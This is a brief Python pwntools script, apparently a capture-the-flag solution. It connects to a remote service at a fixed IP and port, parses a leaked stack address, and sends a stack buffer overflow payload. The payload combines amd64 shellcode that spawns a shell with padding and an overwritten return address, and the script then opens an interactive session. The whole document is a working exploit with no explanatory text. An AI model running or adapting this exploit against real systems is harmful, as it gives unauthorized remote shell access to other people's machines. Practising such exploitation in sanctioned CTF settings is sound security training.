# coding: utf-8
from pwn import *
pr = remote("207.154.239.148", 1337)
context.arch = "amd64"
asm_shell = asm(shellcraft.sh())
r = pr.recv()
addr = int(re.findall(b"(0x[0-9a-f]{6,16})", r)[0], 16)
payload = b''
payload += asm_shell
payload += (520 - len(asm_shell)) * b'z' + p64(addr - 540)
pr.sendline(payload)
pr.interactive()
